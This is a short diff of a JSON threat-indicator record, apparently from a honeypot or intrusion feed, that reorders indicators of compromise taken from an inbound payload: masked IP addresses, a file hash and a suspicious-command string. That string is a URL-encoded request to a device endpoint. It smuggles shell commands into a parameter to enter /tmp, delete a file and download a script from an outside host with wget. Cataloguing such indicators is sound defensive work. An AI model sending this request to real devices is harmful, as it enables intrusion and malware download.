@@ -3,25 +3,25 @@
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
-    "value": "143.0.0.XXX"
+    "value": "190.179.177.XXX"
   },
   {
     "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
     "type": "ip",
-    "value": "190.179.177.XXX"
-  },
-  {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "75007cd893ad5e5a27a760336ca6b337505779f83ddd2c406c13757c06f5295d"
+    "value": "143.0.0.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F85.239"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "75007cd893ad5e5a27a760336ca6b337505779f83ddd2c406c13757c06f5295d"
   },
   {
     "asn": "Interserver, Inc",
